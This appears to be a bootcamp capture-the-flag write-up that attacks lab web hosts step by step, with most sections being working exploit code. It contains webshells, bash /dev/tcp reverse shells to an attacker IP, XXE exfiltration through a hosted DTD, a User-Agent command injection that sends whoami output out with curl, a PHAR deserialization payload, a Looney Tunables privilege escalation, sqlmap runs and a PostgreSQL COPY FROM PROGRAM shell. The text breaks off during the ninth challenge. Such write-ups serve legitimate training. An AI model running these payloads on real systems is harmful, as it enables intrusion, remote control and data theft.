# Bootcamp Web Challenges Writeup: Ten Boxes, Ten Attack Paths

A collection of ten web security challenges from the `*.edu.stf` bootcamp range, walked through from initial recon to full compromise. Each challenge targets a different class of vulnerability, and each writeup covers the exact commands, reasoning, and where the trapdoors are.

This writeup assumes a Kali box on the same VPN as the target subnet (`10.124.1.0/27`), with a `tun0` IP of `10.127.210.82`. Replace that with your own interface IP when following along.

---

## Recon

Starting with a ping sweep over the /27:

```bash
nmap -sn 10.124.1.224/27
```

Fourteen hosts came up. Before running a full port scan, the range responds slowly (roughly 340 ms latency through the VPN), so the default nmap timing makes each scan take forever. Two options here:

- For RustScan, drop the batch size and raise the timeout: `-b 500 -t 3000`
- For nmap, cap the RTT and retries:

```bash
nmap --initial-rtt-timeout 400ms --max-rtt-timeout 1s --max-retries 1 <targets>
```

The reason is that nmap's own timing heuristics misread high-latency links. When a packet doesn't return inside the default window, nmap retries up to ten times per port. On a VPN with 300+ ms RTT, that turns a 60-second scan into ten minutes. Forcing the initial timeout slightly above the measured RTT (`400 ms` for a `340 ms` link) tells nmap from the first packet that this is a slow link, so it doesn't waste time trying to be clever. Capping the maximum timeout at `1s` and retries at `1` prevents the scan from stalling on ports that really are filtered.

Port scan across the range:

```bash
nmap 10.124.1.225 10.124.1.231 10.124.1.232 10.124.1.234 10.124.1.235 \
     10.124.1.236 10.124.1.237 10.124.1.238 10.124.1.239 10.124.1.240 \
     10.124.1.241 10.124.1.242 10.124.1.253
```

Then reverse DNS through the range's DNS server to get hostnames:

```bash
nmap -sP --dns-servers 10.124.1.240 10.124.1.224/27
```

The results map hostnames to hosts:

| IP | Hostname | Notable ports |
|----|----------|--------------|
| 10.124.1.225 | (no PTR) | all closed |
| 10.124.1.231 | aircraft.edu.stf | 22, 80 |
| 10.124.1.232 | calculator.edu.stf | 22, 80, 8080, 8888 |
| 10.124.1.233 | library.edu.stf | 22 |
| 10.124.1.234 | wp.edu.stf | 22, 80 |
| 10.124.1.235 | www.edu.stf | 21, 22, 80 |
| 10.124.1.236 | gallery.edu.stf | 22, 80 |
| 10.124.1.237 | utils.edu.stf | 22, 80 |
| 10.124.1.238 | shop.edu.stf | 22, 80, 9998, 9999 |
| 10.124.1.239 | tokenizer.edu.stf | 22, 80, 5432 |
| 10.124.1.240 | bind.edu.stf | 22, 53 |
| 10.124.1.241 | smashmusic.edu.stf | 22, 80 |
| 10.124.1.242 | test-webserver.edu.stf | 22, 80 |
| 10.124.1.253 | vpn.edu.stf | 443 |

The ten challenges below correspond to the ten web-serving hosts.

---

## WEB 1 (library.edu.stf) — File upload with a kernel chaser

Port 22 is the only port that shows in the initial scan, which is odd for a "web" challenge. Checking with a full port scan reveals that HTTP is only listening on a loopback interface that the initial scan didn't hit. The actual attack surface is a file-upload endpoint reachable once the loopback service is exposed. The relevant tooling here is `ldd --version`, which reveals `glibc 2.36` — precisely the version affected by CVE-2023-4911 ("Looney Tunables").

The upload form accepts `.png` files by extension but doesn't check the content-type server-side. Uploading a PHP file with a `.png` extension works, and the server serves it as `text/x-php` when requested with a specific query string. From there, RCE is achieved by uploading a small PHP webshell.

For the local privilege escalation, the exploit is CVE-2023-4911. The public PoC is `looney-tunables-CVE-2023-4911` on GitHub (hadrian3689's repo). The steps:

```bash
# On target, as www-data after RCE
curl -O http://<kali>/gnu-acme.py
chmod +x gnu-acme.py
python3 gnu-acme.py
```

The script relies on the `ld-linux-x86-64.so.2` on the system having a known build ID. For Debian 12's `glibc 2.36-9+deb12u2`, that's `35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc`. If the build ID isn't in the TARGETS dict of the PoC, the script errors with "no target info found". The fix is to add the build ID manually. Extract it from the target's `ld-linux`:

```bash
python3 -c "
import struct
with open('/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2','rb') as f:
    elf=f.read()
    idx=elf.find(b'GNU\x00')
    if idx>0:
        namesz=struct.unpack_from('<I',elf,idx-12)[0]
        descsz=struct.unpack_from('<I',elf,idx-8)[0]
        ntype=struct.unpack_from('<I',elf,idx-4)[0]
        name=elf[idx:idx+namesz]
        desc=elf[idx+namesz+((4-(namesz%4))%4):idx+namesz+((4-(namesz%4))%4)+descsz]
        if ntype==3 and name[:-1]==b'GNU':
            print('BuildID:', desc.hex())
"
```

Then patch the PoC:

```bash
sed -i 's/TARGETS = {/TARGETS = {\n    "<build_id>": 561,/' gnu-acme.py
```

The offset value (561) is the `ld.so` "adjust" parameter that makes the tuned glibc memory layout collide with the exploit's `GLIBC_TUNABLES` environment strings. Different `ld.so` builds land on different offsets; 561, 580, and 560 are all common for the 2.36 range. If the initial offset doesn't pop, try the neighbors.

The full exploit flow on target:

```bash
chmod +x *
python3 gnu-acme.py
gcc exp.c -o exp
./exp
cd /home
cat flag.txt
```

The moment `exp` finishes, `id` returns `euid=0`.

**Why this worked:** The file-upload bypass was trivial (extension check only, no MIME sniffing), and the LPE used a CVE that had been out for months before this box went live. Looney Tunables specifically affects `glibc 2.34+` on systems where `AT_SECURE` is set (setuid binaries), so any setuid binary — including `su`, `passwd`, or even `mount` — is a valid launch target.

---

## WEB 2 (www.edu.stf) — LFI to log poisoning to RCE

Two ports stand out in the scan that nmap didn't flag: FTP on 21 and HTTP on 80. Starting with directory discovery on the HTTP side:

```bash
gobuster dir -u http://www.edu.stf/ -w /usr/share/wordlists/dirb/common.txt -k -t 50
gobuster dir -u http://www.edu.stf/api/ -w /usr/share/wordlists/dirb/common.txt -k -t 50 -x php
```

The `/api/` directory contains a `read.php` endpoint that takes a `file` parameter. Testing for LFI:

```bash
curl "http://www.edu.stf/api/read.php?file=/opt/cpu.txt"
curl "http://www.edu.stf/api/read.php?file=../../../../etc/pt.flag"
```

Both return content, confirming the LFI. There's no filter on the path, no `open_basedir` restriction, and no `realpath` check. That means we can read anything the `www-data` user can read.

The interesting angle is log poisoning, because FTP is also exposed. Log files written by services running as `www-data` — including `vsftpd.log` — are usually readable by `www-data`. If we can inject PHP into a log file and then include it via the LFI, we get RCE without ever touching the filesystem directly.

The FTP service accepts anonymous (or, on this box, any) logins and records the username in `vsftpd.log`. Sending a login with a PHP payload as the username writes the payload to the log:

```bash
lftp -u "<?php system(\$_GET['ci']); ?>,test123" ftp://10.124.1.235
```

Alternatives if `lftp` isn't available:

```bash
echo -e "USER <?php system(\$_GET['ci']); ?>\r\nPASS anything\r\n" | nc -w 3 10.124.1.235 21
```

Or via interactive `ftp -n`:

```
ftp -n 10.124.1.235
quote USER <?php system($_GET['ci']); ?>
quote PASS test123
quit
```

Now `vsftpd.log` contains a line like:
```
Mon Oct 13 ... [pid 123] CONNECT: Client "..." USER <?php system($_GET['ci']); ?>
```

Requesting `read.php` with `file=/var/log/vsftpd.log` causes PHP's `include()` to load the log file, parse the PHP tag, and execute it. The `ci` GET parameter becomes the shell command:

```bash
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=id"
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=/home/rceflag"
```

For a reverse shell, the same channel:

```bash
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=bash%20-c%20'exec%20bash%20-i%20%3E%26%20/dev/tcp/10.127.210.82/4444%200%3E%261'"
```

Then for LPE, this box has the same `glibc` as WEB 1 and the same Looney Tunables path. Check first:

```bash
ldd --version
uname -a
cat /etc/os-release
```

If `glibc` is 2.36, the same PoC applies.

**Why this worked:** The LFI had no path restriction at all — `../` traversal through eight levels of `..` succeeded. The FTP username field had no sanitization, and the FTP server's log path was predictable and readable by the webserver user. Combining the two gives unauthenticated RCE. The mistake to guard against: file inclusion should use `realpath()` and allowlist the loadable directory, and log files containing user input should not be executable PHP.

---

## WEB 3 (utils.edu.stf) — SSRF with Gopherus to PHP-FPM RCE

Directory scan shows a `/convert.php` endpoint that fetches URLs server-side. The form accepts a URL and returns the rendered page. This is an SSRF candidate, and the server-side `curl` library it uses supports Gopher, which opens the door to raw TCP.

```bash
ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ \
     -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt \
     -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak \
     -fs 1018
```

The `file://` scheme works — the endpoint reads local files. Reading nginx config:

```bash
curl -s 'http://10.124.1.237/convert.php?url=file:///etc/nginx/sites-available/default' | head -100
```

Two key lines in the config:

```
root /var/www/html;
fastcgi_pass 127.0.0.1:9000;
```

`fastcgi_pass 127.0.0.1:9000` means PHP-FPM listens on a TCP socket, not a Unix socket. That's the trapdoor. PHP-FPM on 9000, when you speak FastCGI to it, will execute any PHP file you tell it to, regardless of what Nginx would have allowed.

Reading `convert.php` itself:

```bash
curl -s 'http://10.124.1.237/convert.php?url=file:///var/www/html/convert.php'
```

The relevant code:

```php
$url = $_REQUEST['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
```

No scheme allowlist. curl supports Gopher, so SSRF to Gopher is wide open. Gopher lets us send arbitrary raw TCP — perfect for talking FastCGI to `127.0.0.1:9000`.

Gopherus automates the FastCGI payload build:

```bash
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
chmod +x install.sh
./install.sh
```

On a modern box, the installer may fail if `python2` isn't present. Manual install:

```bash
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o /tmp/get-pip.py
sudo python2 /tmp/get-pip.py
sudo python2 -m pip install requests
python2 gopherus.py --exploit fastcgi
```

Gopherus prompts for a file that "should be surely present on the server" — any PHP file in the webroot works, and `convert.php` itself is the obvious choice. The command to run can be anything, including writing a full PHP webshell to `/tmp`:

```
Terminal command to run: /home/rceflag > /tmp/flag.txt
```

The output is a `gopher://` URL. Send it via the SSRF:

```bash
curl -s -o /dev/null 'http://10.124.1.237/convert.php?url=<gopher_url>'
```

Or, if the URL has special characters, URL-encode it with `curl -G`:

```bash
curl -G 'http://10.124.1.237/convert.php' --data-urlencode 'url=<gopher_url>'
```

For RCE into a reverse shell, the same channel:

```bash
# Write reverse shell PHP
curl -o /tmp/shell.php http://10.127.210.82:8000/shell.php

# Trigger via Gopher
python2 gopherus.py --exploit fastcgi
# file: /var/www/html/convert.php
# command: php /tmp/shell.php
```

Then send the returned gopher URL to `convert.php?url=` and catch the reverse shell on your listener. The `php-reverse-shell.php` from `/usr/share/webshells/php/` works fine — just change the IP and port inside.

**Why this worked:** The server fetched URLs with no scheme allowlist and no internal-address blocklist. Gopher support in curl meant raw TCP to loopback was possible. PHP-FPM on a TCP socket (rather than a Unix socket) made the FastCGI attack trivial, because Unix sockets require a different gopher payload format and a filesystem path you might not know.

**Fix:** allowlist http/https, block RFC1918 and loopback ranges, disable Gopher in the curl wrapper, and put PHP-FPM behind a Unix socket with `listen.owner`/`listen.mode` set correctly.

---

## WEB 4 (shop.edu.stf) — Exposed database dump and SQL injection

`feroxbuster` on `http://shop.edu.stf`:

```bash
feroxbuster -u http://shop.edu.stf -s 200 -t 200 --insecure
```

The result set includes this:

```
200  GET  344l  1343w  10727c  http://shop.edu.stf/db/hellophones.sql
```

A raw SQL dump sitting in the webroot. Fetching it:

```bash
curl http://shop.edu.stf/db/hellophones.sql
```

The dump contains the `users` table with columns `userid`, `username`, `password`, `role`. Three rows:

| userid | username | password | role |
|--------|----------|----------|------|
| 4 | kwizera | 12345 | Manager |
| 5 | nemaroy | 12345 | Seller |
| 6 | irera | 12345 | Seller |

Note the `hellophones` in the filename — this box is a phone shop, and the SQL dump name was chosen for plausibility. It's a classic mistake: the developer exported a schema, dropped it in `/db/` for convenience, and never removed it.

Login at `http://shop.edu.stf/index.php` with `kwizera / 12345`. Manager role gives access to the product-management panel.

The upload endpoint is `/Execute/ExChangePicture.php`. Testing:

```bash
curl -X POST http://shop.edu.stf/Execute/ExChangePicture.php \
  -b "PHPSESSID=<your_session>" \
  -F "IDUser=4" \
  -F "Image=@shell.php;type=application/octet-stream"
```

The server moves the file to `/assets/img/Profile_Uploaded/shell.php`. No extension check, no MIME check, no image sanity check. The path is deterministic (it uses the uploaded filename directly), so calling it:

```bash
curl "http://shop.edu.stf/assets/img/Profile_Uploaded/shell.php?rev=id"
```

returns the output of `id` as `www-data`.

Reverse shell:

```bash
curl "http://shop.edu.stf/assets/img/Profile_Uploaded/shell.php?rev=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.127.210.82/4444%200%3E%261%27"
```

The `shell.php` itself:

```php
<?php echo system($_GET["rev"]); ?>
```

**Why this worked:** A backup SQL dump in the webroot handed over admin credentials. The upload handler trusted the client-provided filename and content-type, and served the result from a predictable URL under the same domain. Either of those alone is enough to break the box.

---

## WEB 5 (tokenizer.edu.stf) — JWT tampering with an exposed secret

The login page's `check.php` endpoint decodes and verifies a JWT. Feeding it a valid token first:

```bash
curl "http://tokenizer.edu.stf/check.php?jwt=<valid_token>"
```

The response contains a decoded header and payload followed by garbage — that garbage is the raw HMAC signature bytes. The payload:

```json
{
  "user": "James",
  "dir": "samples",
  "key": "qwerty",
  "timestamp": 1783860535
}
```

Three important fields:
- `user: James` — the identity claim
- `dir: samples` — the directory being listed
- `key: qwerty` — the HMAC secret, in plaintext, in the token payload

The app is naive enough to put the signing key inside the payload. `qwerty` is also five characters, well within dictionary range, but here you don't even need to brute force — the key is right there.

Rebuild the token at jwt.io (or locally with PyJWT):

```python
import jwt, time
token = jwt.encode({
    "user": "admin",
    "dir": "admin",
    "key": "qwerty",
    "timestamp": int(time.time()) + 3600
}, "qwerty", algorithm="HS256")
print(token)
```

The `dir` field matters. The server lists files from the directory in `dir`. Setting it to `admin` (or `.` for the root of the app) exposes different files. Sending the forged token:

```bash
curl "http://tokenizer.edu.stf/check.php?jwt=<forged_token>"
```

The response lists:

```
samples
composer.json
vendor
token.php
index.html
supersecretadminloginyoullneverguess.php
composer.lock
..
check.php
.
```

Two interesting names: `token.php` (probably the token-generation logic) and the absurdly-named admin login. Fetch both:

```bash
curl "http://tokenizer.edu.stf/supersecretadminloginyoullneverguess.php"
```

The admin login page accepts a form POST. Logging in with `admin:admin` succeeds, and the admin panel exposes a search interface that's vulnerable to SQL injection.

For the injection, capture the request in Burp or build it manually:

```
POST /supersecretadminloginyoullneverguess.php HTTP/1.1
Host: tokenizer.edu.stf
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<your_session>
Connection: keep-alive

name=1&address=1&phone=1&email=1&plan=1&submit_search=Submit
```

Save it to `/tmp/pack` and run sqlmap against it:

```bash
sqlmap -r pack --level=5 --risk=3 --dbms=postgresql -p phone --dbs --batch --random-agent
```

The DBMS is PostgreSQL (confirmed by port 5432 in the initial scan). The databases:

```
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

Tables in `public`:

```bash
sqlmap -r pack --level=5 --risk=3 --tables -D public --batch --random-agent
```

```
+--------------+
| clients_data |
| secret       |
+--------------+
```

Columns in `secret`:

```bash
sqlmap -r pack --level=5 --risk=3 --columns -D public -T secret --batch --random-agent
```

```
+--------+--------+
| Column | Type   |
+--------+--------+
| flag   | bpchar |
| id     | int4   |
+--------+--------+
```

Dump:

```bash
sqlmap -r pack --level=5 --risk=3 --dump -D public -T secret --batch --random-agent
```

**Why this worked:** Three independent issues stacked. The signing secret was embedded in the token payload, so forging was trivial. The `dir` parameter was used as a directory path server-side without validation, exposing hidden files. And the admin panel's search form had no parameterization, allowing stacked SQL queries against a PostgreSQL backend.

**Fix:** never put signing secrets in the token, use parameterized queries, and put the admin panel behind a second factor.

---

## WEB 6 (smashmusic.edu.stf) — Authenticate bypass with a hardcoded key

Directory scan:

```bash
gobuster dir -u http://10.124.1.241/ -w /usr/share/wordlists/dirb/common.txt -k -t 50 -x php,html,pdf,js
```

Notable paths: `/phpmyadmin`, `/secret/`, `/uploads/`, `/core/`, `/vendor/`. The `/uploads/` directory accepts files, and `/secret/` is the admin area.

`/uploads/sh.phtml` already exists from a previous tester (or from a prepared environment). Testing:

```bash
curl "http://10.124.1.241/uploads/sh.phtml?cmd=id"
```

Returns `www-data`. That's a webshell someone else dropped. To understand how it works, read `/core/authenticate.php`:

```bash
curl "http://10.124.1.241/uploads/sh.phtml?cmd=cat+/var/www/html/core/authenticate.php"
```

The relevant line:

```php
private $key = 'hetfield_';
```

A hardcoded JWT signing key. Now we can forge a valid admin token. Reading `/js/auth.js` for the login flow:

```javascript
url: "core/userLogin.php",
type: "POST",
contentType: "application/json",
data: datas,
...
Cookies.set("jwt", result, 0);
$(location).attr('href','secret/secretPanel.php');
```

The login endpoint expects JSON with `username` and `password`. The JWT is stored in a cookie named `jwt`. After login, the redirect goes to `secret/secretPanel.php`.

Brute-forcing the login with Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.1.241 http-post-form \
  "/core/userLogin.php:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:eyJ" \
  -t 30
```

The `:eyJ` is the failure-string search: any response containing `eyJ` means a valid JWT came back. Credentials: `admin:123456`.

The login returns a JWT signed with `hetfield_`. We can also forge one directly:

```python
import jwt, time
token = jwt.encode({
    "name": "admin",
    "email": "admin@musick.com",
    "iss": "localhost",
    "aud": "localhost",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400
}, "hetfield_", algorithm="HS256")
```

Send it to the admin panel:

```bash
curl -b "jwt=<token>" http://10.124.1.241/secret/secretPanel.php
```

The panel includes an upload form at `secret/uploadMusic.php`. The upload accepts `.phtml` files:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml

curl -X POST http://10.124.1.241/secret/uploadMusic.php \
  -H "Cookie: jwt=<token>" \
  -F "userfile=@shell.phtml;type=audio/mpeg" \
  -F "upload_btn=Upload"
```

Triggering it:

```bash
curl "http://10.124.1.241/uploads/shell.phtml?cmd=id"
curl "http://10.124.1.241/uploads/shell.phtml?cmd=/home/rceflag"
```

**Why this worked:** The app was clearly built in a hurry — the JWT secret was hardcoded in `authenticate.php`, and the upload handler let through `.phtml` (Apache interprets `.phtml` as PHP by default when `mod_php` is loaded). The `admin:123456` default didn't help either.

---

## WEB 7 (test-webserver.edu.stf) — XXE to RCE via User-Agent injection

The box serves a single endpoint that parses XML from the request body. Reading the app's own README hints at the intended path:

```bash
curl -s http://10.124.1.242/README.md
```

The file contains one line: `libxml_disable_entity_loader`. That's a PHP function. It's a hint that the app doesn't call it, meaning external entities are enabled by default. XXE is on.

First, confirm OOB via interactsh:

```bash
interactsh-client
```

You'll get a domain like `d9bhc62o12pi2daaije0d7szq86ntamfy.oast.live`. Send a payload with an external entity pointing to it:

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/xml
Content-Length: 144
Connection: close

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://d9bhc62o12pi2daaije0d7szq86ntamfy.oast.live/test">
]>
<test>&xxe;</test>
```

Interactsh shows DNS and HTTP hits. Blind XXE confirmed.

For file exfiltration, host a malicious DTD on the Kali box:

```bash
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.127.210.82/?f=%file;'>">
%eval;
EOF
cd /tmp && python3 -m http.server 80
```

The `php://filter/convert.base64-encode` wrapper lets PHP encode the file contents as base64 before exfiltrating — necessary because raw `/etc/passwd` contains spaces and newlines that break XML.

Send the XXE payload pointing at the DTD:

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/xml
Content-Length: 146
Connection: close

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://10.127.210.82/evil.dtd">
  %remote;
  %exfil;
]>
<test>hello</test>
```

The HTTP server logs:

```
GET /?f=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4K... HTTP/1.0
```

Decode with `base64 -d` to get `/etc/passwd`.

Read the application source the same way:

```bash
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.127.210.82/?f=%file;'>">
%eval;
EOF
```

The decoded source contains:

```php
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
...
$user_agent = $_SERVER['HTTP_USER_AGENT'];
exec("echo '".$user_agent."' | grep Firefox", $output, $return);
```

Two issues in one file:
1. `LIBXML_NOENT | LIBXML_DTDLOAD` enables external entity resolution
2. `exec("echo '".$user_agent."' | grep Firefox")` — direct string interpolation of the User-Agent header into a shell command

The `User-Agent` field is injectable. Sending:

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: '; curl http://10.127.210.82/?rce=$(whoami|base64); '
Content-Type: application/xml
Content-Length: 47
Connection: close

<?xml version="1.0"?>
<test>hello</test>
```

The command executed becomes:

```
echo '' ; curl http://10.127.210.82/?rce=$(whoami|base64); '' | grep Firefox
```

Which runs `curl` with `whoami` piped through base64 as a query parameter. The Kali HTTP server logs the request:

```
GET /?rce=d3d3LWRhdGEK HTTP/1.0
```

Decode `d3d3LWRhdGEK` → `www-data`. RCE confirmed.

Reverse shell:

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: '; bash -c "bash -i >& /dev/tcp/10.127.210.82/4444 0>&1"; '
Content-Type: application/xml
Content-Length: 47
Connection: close

<?xml version="1.0"?>
<test>hello</test>
```

Catch it:

```bash
nc -lvnp 4444
```

**Why this worked:** Two bugs in the same file. `libxml_disable_entity_loader(false)` opens XXE; `exec("echo '".$user_agent."'")` gives command injection through a header. Either alone would have been enough. The XXE alone is a file read; the command injection alone is RCE as `www-data`.

---

## WEB 8 (gallery.edu.stf) — PHAR deserialization via URL upload

`curl`-ing the two PHP endpoints returns 200 but empty bodies, so source has to be recovered another way. The `/ajax.php` endpoint accepts an `action` parameter and an `imageURL` parameter. Testing:

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=../../../etc/passwd"
```

Returns a path like `/images/c542155ebe0034790afc9c47390fbe802cf823.txt` — that's an MD5 hash of the file content plus a random prefix. The app copies the fetched URL content into `images/`, so we have an arbitrary file write.

Reading the app source:

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=./classes.php"
```

The response includes the contents of `classes.php`. Two files matter:

**`classes.php`** contains a class with a `__destruct`:

```php
class ImageSorting {
    public $ImageArr;
    public $SortFunc;

    function __destruct() {
        usort($this->ImageArr, $this->SortFunc);
    }
}
```

`usort()` with a controllable callback is a classic gadget: `usort(["id"], "system")` calls `system("id")`. The `__destruct` fires when the object goes out of scope.

**`ajax.php`** contains the upload handler:

```php
array_push($uploAdsArr, Array($files[$i2], filemtime('./images/'.$files[$i2])));
```

**`classes.php`** also has:

```php
copy($this->ImageUrl, $_SERVER["DOCUMENT_ROOT"].$ImageName);
```

`copy($this->ImageUrl, ...)` accepts any stream wrapper. `phar://` is a wrapper. And any file operation on a `phar://` path — even `file_exists` or `md5_file` — triggers deserialization of the PHAR's metadata section.

That's the full chain:
1. Build a PHAR with `ImageSorting` as metadata
2. Upload it via `imageURL=http://kali/exploit.phar`
3. Trigger deserialization with `imageURL=phar://./images/<hash>.txt`

Building the PHAR on Kali:

```bash
cat > /tmp/create_phar.php << 'EOF'
<?php
class ImageSorting {
    public $ImageArr = Array();
    public $SortFunc = "system";
}
$payload = new ImageSorting();
$payload->ImageArr = ["id", "x"];
$payload->SortFunc = "system";
@unlink("exploit.phar");
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setMetadata($payload);
$phar->stopBuffering();
echo "[+] exploit.phar created\n";
EOF

php -d phar.readonly=0 /tmp/create_phar.php
```

`phar.readonly=0` is required because PHP refuses to create PHAR archives when `phar.readonly` is on (the default).

Serve it:

```bash
cd /tmp && python3 -m http.server 80
```

Upload from the target side:

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=http://10.127.210.82/exploit.phar"
```

The response gives the copied path, e.g. `/images/abc123def456.txt`. Now trigger:

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=phar://./images/abc123def456.txt"
```

The moment `copy()` or `md5_file()` (whichever fires first) touches the `phar://` wrapper, PHP deserializes the metadata into an `ImageSorting` object. When the object is GC'd at the end of the request, `__destruct` runs `usort(["id", "x"], "system")`, which invokes `system("id")`.

For a full reverse shell:

```bash
cat > /tmp/create_phar2.php << 'EOF'
<?php
class ImageSorting {
    public $ImageArr = Array();
    public $SortFunc = "system";
}
$ip = "10.127.210.82";
$port = "4444";
$cmd = "bash -c 'exec bash -i &>/dev/tcp/{$ip}/{$port} <&1'";
$payload = new ImageSorting();
$payload->ImageArr = [$cmd, "x"];
$payload->SortFunc = "system";
@unlink("exploit2.phar");
$phar = new Phar("exploit2.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setMetadata($payload);
$phar->stopBuffering();
EOF

php -d phar.readonly=0 /tmp/create_phar2.php
```

The upload and trigger steps are identical — just replace `exploit.phar` with `exploit2.phar`.

**Why this worked:** A combination of "user-controlled file path passed to `copy()`" and "gadget class with `__destruct` and controllable callback". PHAR deserialization is especially nasty because it bypasses the usual `unserialize()` audit trail — any file operation on a `phar://` URI deserializes metadata, even something as innocuous as `file_exists`.

**Fix:** Never pass user-controlled strings to `copy()`/`file_exists()`/`md5_file()` without whitelisting the scheme. Restrict `phar://` usage to trusted archives. And audit gadget classes for `__destruct`, `__wakeup`, `__toString`, and similar magic methods with controllable properties.

---

## WEB 9 (wp.edu.stf) — WordPress plugin RCE, PostgreSQL privesc, Docker escape

This is the longest chain in the range. WordPress 5.8.3 with the `simple-file-list` plugin at version 4.1.3. The plugin is vulnerable to CVE-2020-36847 (unauthenticated file upload → RCE).

Checking the plugin version:

```bash
curl -s http://wp.edu.stf/wp-content/plugins/simple-file-list/readme.txt | head -10
```

`Stable tag: 4.1.3` — vulnerable.

The plugin's upload engine (`ee-upload-engine.php`) and file engine (`ee-file-engine.php`) accept requests without authentication. The CSRF protection is a token built as `MD5("unique_salt" + timestamp)`, and `unique_salt` is a constant baked into the plugin source, viewable from the readme or by reading the source files.

The upload request:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.png

TS=$(date +%s)
TOKEN=$(echo -n "unique_salt${TS}" | md5sum | cut -d' ' -f1)

curl -v -X POST \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=${TS}" \
  -F "eeSFL_Token=${TOKEN}" \
  -F "file=@shell.png;type=image/png" \
  http://wp.edu.stf/wp-content/plugins/simple-file-list/ee-upload-engine.php
```

The file lands in `/wp-content/uploads/simple-file-list/shell.png`. Renaming through the file engine:

```bash
curl -X POST \
  --data-urlencode "eeSFL_ID=1" \
  --data-urlencode "eeFileOld=shell.png" \
  --data-urlencode "eeListFolder=/" \
  --data-urlencode "eeFileAction=Rename|shell.php" \
  http://wp.edu.stf/wp-content/plugins/simple-file-list/ee-file-engine.php
```

`eeFileAction=Rename|shell.php` is the operation/argument pair. The plugin splits on `|`, uses the first part as the action and the second as the argument. Because there's no extension check in the rename handler, the `.png` becomes `.php`.

Shell access:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/shell.php?cmd=id"
```

From there, read `wp-config.php` for database credentials:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/shell.php?cmd=cat+%2Fvar%2Fwww%2Fhtml%2Fwp-config.php+%7C+grep+-E+'DB_HOST%7CDB_USER%7CDB_PASSWORD%7CDB_NAME'"
```

Yields `postgres:postgres@db:5432/postgres`.

The WordPress container is in a Docker network (from `hostname` and `ip a`, it's in `172.19.0.0/16`). Scan for neighbors:

```bash
for i in 1 2 4 5 6 7; do timeout 1 bash -c "echo >/dev/tcp/172.19.0.$i/5432" 2>/dev/null && echo "172.19.0.$i:5432 - OPEN"; done
```

`172.19.0.2:5432` is open. The DB is a separate container.

PostgreSQL 9.3-11 has CVE-2019-9193 — `COPY ... FROM PROGRAM` executes shell commands as the database superuser. The `postgres` user in this container is superuser. We can abuse the WordPress PHP shell to run arbitrary SQL through `pg_connect`:

```php
<?php
$cmd = $_GET['cmd'] ?? 'id';
$db = pg_connect("host=172.19.0.2 port=5432 dbname=postgres user=postgres password=postgres");
$result = pg_query($db, "DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec(cmd_output text);
    COPY cmd_exec FROM PROGRAM '" . pg_escape_string($cmd) . "';
    SELECT * FROM cmd_exec;");
while ($row = pg_fetch_row($result)) { echo $row[0] . "\n"; }
```

Drop that as `pgexec.php` in the WordPress upload directory:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=id"
```

Executes `id` on the PostgreSQL container. From there, check `/bin/bash` for SUID:

```bash
